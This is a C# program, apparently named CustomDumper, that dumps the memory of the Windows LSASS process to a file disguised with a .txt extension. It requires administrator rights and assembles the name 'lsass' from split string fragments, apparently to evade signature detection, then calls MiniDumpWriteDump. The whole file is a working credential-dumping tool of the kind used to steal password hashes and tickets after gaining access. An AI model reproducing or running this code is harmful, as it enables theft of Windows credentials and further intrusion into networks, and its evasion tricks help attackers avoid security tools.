using System;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;


namespace CustomDumper
{
    class Program
    {
        [DllImport("Dbghelp.dll")] static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);


        static int getProcessPid() {
            string str1 = "l";
            string str3 = "s";
            string str5 = "a";
            string processname_str = str1 + str3 + str5 + str3 + str3;
            int processPID = Process.GetProcessesByName(processname_str)[0].Id;
            return processPID;
        }


        static void Main(string[] args)
        {
            // Check we are running an elevated process
            if (WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                return;
            }

            //Get process PID
            int processPID = getProcessPid();
            Console.WriteLine("[+] Process PID: " + processPID);

            // Generate the file name or get it from the input arguments
            String filename;
            if (args == null || args.Length == 0)
            {
                // Source: https://docs.microsoft.com/en-us/dotnet/api/system.datetime.tostring?view=net-5.0
                String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
                String extension = ".txt";
                filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
            }
            else
            {
                filename = args[0];
            }


            // Create output file
            FileStream output_file = new FileStream(filename, FileMode.Create);

            // Create handle to the process
            // We need (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), we can get the values from https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
            uint processRights = 0x0010 | 0x0400;
            IntPtr processHandle = OpenProcess(processRights, false, processPID);

            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process created correctly.");
                //Dump the process            
                bool isDumped = MiniDumpWriteDump(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                if (isDumped)
                {
                    Console.WriteLine("[+] Successfully dumped process with pid " + processPID + " to file " + filename);
                }
                else
                {
                    Console.WriteLine("[-] Error: Process not dumped.");
                }
            }
            else {
                Console.WriteLine("[-] Error: Handle to process is NULL.");
            }
            
        }

    }
}
